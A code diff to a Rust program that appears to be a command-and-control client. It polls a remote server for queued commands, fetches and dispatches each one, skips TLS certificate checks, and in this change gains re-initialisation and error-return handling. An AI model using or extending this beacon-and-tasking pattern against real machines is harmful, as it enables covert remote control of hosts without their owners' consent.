@@ -68,7 +68,7 @@ fn init_host(host_ip:&str) -> Option<String>{
     hostname
 }
 
-fn get_commands(identifier:&str){
+fn get_commands(identifier:&str) -> bool {
     let commands_url = format!("{}/hosts/commands",SERVER_IP);
 	let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
@@ -83,26 +83,37 @@ fn get_commands(identifier:&str){
         }, Err(_)=>{
             print(&"Get_Commands - Can't connect to server");
             thread::sleep(SLEEP_TIME);
-            return
+            return false
         }
     };
     print(&res);
     //if the server response contains an error, restart the main loop
 
+    if res.contains("RE-INIT"){
+        print("Re-init received. Re-initializing...");
+        return false
+    }
+
+    if res.contains("502 Bad Gateway"){
+        print("502 Bad Gateway");
+        thread::sleep(SLEEP_TIME);
+        return false
+    }
     if res == "NONE" || res == "" {
         print("No commands, sleeping");
-        return
+        return true
     }
 
     let cmd_ids = res.split(";");
     for cmd_id in cmd_ids{
         let cmd = get_command(cmd_id);
         if cmd.eq("ERROR"){
-            return
+            return false
         }
         println!("{}: {}",cmd_id,cmd);
         handle_command(cmd_id,&cmd,identifier);
     }
+    true
 }
 
 fn get_command(cmd_id:&str) -> String{
@@ -250,7 +261,9 @@ fn get_id(host_ip:&str) -> String {
 
 fn main_loop(identifier:&str) -> Result<String,String>{
     loop{
-        get_commands(&identifier);
+        if !get_commands(&identifier) {
+            return Err(String::from("Error"));
+        }
         thread::sleep(SLEEP_TIME);
     }
 }
